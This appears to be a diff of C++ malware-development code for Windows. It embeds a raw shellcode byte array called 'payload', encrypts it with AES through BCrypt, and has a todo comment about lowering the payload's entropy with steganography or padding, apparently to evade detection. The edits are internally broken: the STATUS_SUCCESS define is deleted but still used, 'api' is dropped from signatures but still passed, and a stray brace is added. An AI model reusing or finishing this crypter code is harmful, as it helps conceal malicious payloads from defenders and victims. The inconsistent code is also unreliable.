@@ -4,8 +4,6 @@
 #include <iostream>
 #include <bcrypt.h>
 
-#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
-
 // todo:reduce entropy of the payload by using steganography to hide in file, 
 // resource section or download and pad payload with repetitive bytes 
 unsigned char payload[] =
@@ -61,18 +59,8 @@ unsigned char payload[] =
 "\x05\xf1\x01\x44\xfd\x51\xf1\x1f\xf3\xdd\xfc\xc2\xc0\x46"
 "\x1c\xd7\xa5\x7b\x60\x05\x02\x26\xd5\x6c\x43";
 
-
-
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
 {
-	API::APIResolver &resolver = API::APIResolver::GetInstance();
-
-	resolver.LoadModules();
-	resolver.ResolveAPI();
-
-	API::API_ACCESS  api = resolver.GetAPIAccess();
-
-	Tools    tools;
 	NTSTATUS status = NULL;
 	DWORD	 dwWritten;
 
@@ -102,11 +90,6 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 
 	//ZeroMemory(key, KEYSIZE);
 	//ZeroMemory(iv , IVSIZE);
-
-	auto word = tools.GetRandomNumber(api);
-
-	//tools.PrintConsole(word);
-	tools.PrintConsole("heeee");
 
 	const char* message = "a";
 
@@ -153,7 +136,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 }
 
 
-bool Encrypt::SimpleEncryption(_In_ void* pPlainTextData, _In_ DWORD sPlainTextSize, _In_ unsigned char* pKey, _In_ unsigned char* pIv, _In_ void** ppCipherTextData, _Out_ DWORD* sCipherTextSize, API::API_ACCESS& api)
+bool Encrypt::SimpleEncryption(_In_ void* pPlainTextData, _In_ DWORD sPlainTextSize, _In_ unsigned char* pKey, _In_ unsigned char* pIv, _In_ void** ppCipherTextData, _Out_ DWORD* sCipherTextSize)
 {
 	if (pPlainTextData == NULL || sPlainTextSize == NULL || pKey == NULL || pIv == NULL)
 		return false;
@@ -178,7 +161,7 @@ bool Encrypt::SimpleEncryption(_In_ void* pPlainTextData, _In_ DWORD sPlainTextS
 }
 
 
-bool Encrypt::InstallAes(PAES pAes, API::API_ACCESS& api)
+bool Encrypt::InstallAes(PAES pAes)
 {
 	NTSTATUS status;
 
@@ -195,40 +178,33 @@ bool Encrypt::InstallAes(PAES pAes, API::API_ACCESS& api)
 	unsigned char* pbKeyObject = NULL;
 	unsigned char* pbCipherText = NULL;
 
-
-	Tools tools;
-
 	// Intializing "hAlgorithm" as AES algorithm Handle
 	status = BCryptOpenAlgorithmProvider(&hAlgorithm, L"AES", NULL, 0);
-	if (!NT_SUCCESS(status)) {
-		tools.ShowError("[!] BCryptOpenAlgorithmProvider Failed");
+	if (status != STATUS_SUCCESS) {
+		std::cout << "[!] BCryptOpenAlgorithmProvider Failed\n";
 		bState = FALSE;
 		CleanEncrypt(hKeyHandle, hAlgorithm, pbKeyObject, pAes, pbCipherText, cbCipherText, api);
 	}
 
 	// Getting the size of the key object variable pbKeyObject. This is used by the BCryptGenerateSymmetricKey function later 
 	status = BCryptGetProperty(hAlgorithm, L"ObjectLength", reinterpret_cast<PBYTE>(&cbKeyObject), sizeof(DWORD), &cbResult, 0);
-	if (!NT_SUCCESS(status)) {
-		tools.ShowError("[!] BCryptGetProperty[1] Failed");
+	if (status != STATUS_SUCCESS) {
+		std::cout << "[!] BCryptGetProperty[1] Failed\n";
 		bState = FALSE;
 		CleanEncrypt(hKeyHandle, hAlgorithm, pbKeyObject, pAes, pbCipherText, cbCipherText, api);
-
 	}
 
 	// Getting the size of the block used in the encryption. Since this is AES it must be 16 bytes.
 	status = BCryptGetProperty(hAlgorithm, L"BlockLength", reinterpret_cast<PBYTE>(&dwBlockSize), sizeof(DWORD), &cbResult, 0);
-	if (!NT_SUCCESS(status)) {
-		tools.ShowError("[!] BCryptGetProperty[2] Failed");
+	if (status != STATUS_SUCCESS) {
 		bState = FALSE;
 		CleanEncrypt(hKeyHandle, hAlgorithm, pbKeyObject, pAes, pbCipherText, cbCipherText, api);
-
 	}
 
 	// Checking if block size is 16 bytes
 	if (dwBlockSize != 16) {
 		bState = FALSE;
 		CleanEncrypt(hKeyHandle, hAlgorithm, pbKeyObject, pAes, pbCipherText, cbCipherText, api);
-
 	}
 
 	// Allocating memory for the key object 
@@ -236,34 +212,30 @@ bool Encrypt::InstallAes(PAES pAes, API::API_ACCESS& api)
 	if (pbKeyObject == NULL) {
 		bState = FALSE;
 		CleanEncrypt(hKeyHandle, hAlgorithm, pbKeyObject, pAes, pbCipherText, cbCipherText, api);
-
 	}
 
 	// Setting Block Cipher Mode to CBC. This uses a 32 byte key and a 16 byte IV.
 	status = BCryptSetProperty(hAlgorithm, L"ChainingMode", (PBYTE)L"ChainingModeCBC", sizeof(L"ChainingModeCBC"), 0);
-	if (!NT_SUCCESS(status)) {
-		tools.ShowError("[!] BCryptSetProperty Failed");
+	if (status != STATUS_SUCCESS) {
+		std::cout << "[!] BCryptSetProperty Failed\n";
 		bState = FALSE;
 		CleanEncrypt(hKeyHandle, hAlgorithm, pbKeyObject, pAes, pbCipherText, cbCipherText, api);
-
 	}
 
 	// Generating the key object from the AES key "pAes->pKey". The output will be saved in pbKeyObject and will be of size cbKeyObject 
 	status = BCryptGenerateSymmetricKey(hAlgorithm, &hKeyHandle, pbKeyObject, cbKeyObject, reinterpret_cast<PBYTE>(pAes->pKey), KEYSIZE, 0);
-	if (!NT_SUCCESS(status)) {
-		tools.ShowError("[!] BCryptGenerateSymmetricKey Failed");
+	if (status != STATUS_SUCCESS) {
+		std::cout << "[!] BCryptGenerateSymmetricKey Failed\n";
 		bState = FALSE;
 		CleanEncrypt(hKeyHandle, hAlgorithm, pbKeyObject, pAes, pbCipherText, cbCipherText, api);
-
 	}
 
 	// Running BCryptEncrypt first time with NULL output parameters to retrieve the size of the output buffer which is saved in cbCipherText
 	status = BCryptEncrypt(hKeyHandle, reinterpret_cast<PUCHAR>(pAes->pPlainText), (ULONG)pAes->dwPlainSize, NULL, pAes->pIv, IVSIZE, NULL, 0, &cbCipherText, 0x00000001);
-	if (!NT_SUCCESS(status)) {
-		tools.ShowError("[!] BCryptEncrypt[1] Failed");
+	if (status != STATUS_SUCCESS) {
+		std::cout << "[!] BCryptEncrypt[1] Failed\n";
 		bState = FALSE;
 		CleanEncrypt(hKeyHandle, hAlgorithm, pbKeyObject, pAes, pbCipherText, cbCipherText, api);
-
 	}
 
 	// Allocating enough memory for the output buffer, cbCipherText
@@ -271,22 +243,21 @@ bool Encrypt::InstallAes(PAES pAes, API::API_ACCESS& api)
 	if (pbCipherText == NULL) {
 		bState = FALSE;
 		CleanEncrypt(hKeyHandle, hAlgorithm, pbKeyObject, pAes, pbCipherText, cbCipherText, api);
-
 	}
 
 	// Running BCryptEncrypt again with pbCipherText as the output buffer
 	status = BCryptEncrypt(hKeyHandle, (PUCHAR)pAes->pPlainText, (ULONG)pAes->dwPlainSize, NULL, pAes->pIv, IVSIZE, pbCipherText, cbCipherText, &cbResult, 0x00000001);
-	if (!NT_SUCCESS(status)) {
-		tools.ShowError("[!] BCryptEncrypt[2] Failed\n");
+	if (status != STATUS_SUCCESS) {
+		std::cout << "[!] BCryptEncrypt[2] Failed\n";
 		bState = FALSE;
 		CleanEncrypt(hKeyHandle, hAlgorithm, pbKeyObject, pAes, pbCipherText, cbCipherText, api);
-
 	}
 
 	CleanEncrypt(hKeyHandle, hAlgorithm, pbKeyObject, pAes, pbCipherText, cbCipherText, api);
 	return bState;
 }
 
+}
 bool Encrypt::CleanEncrypt(void*& hKeyHandle, void*& hAlgorithm, unsigned char*& pbKeyObject, PAES& pAes, unsigned char* pbCiperText, DWORD cbCiperText, API::API_ACCESS& api)
 {
 	NTSTATUS stat = NULL;
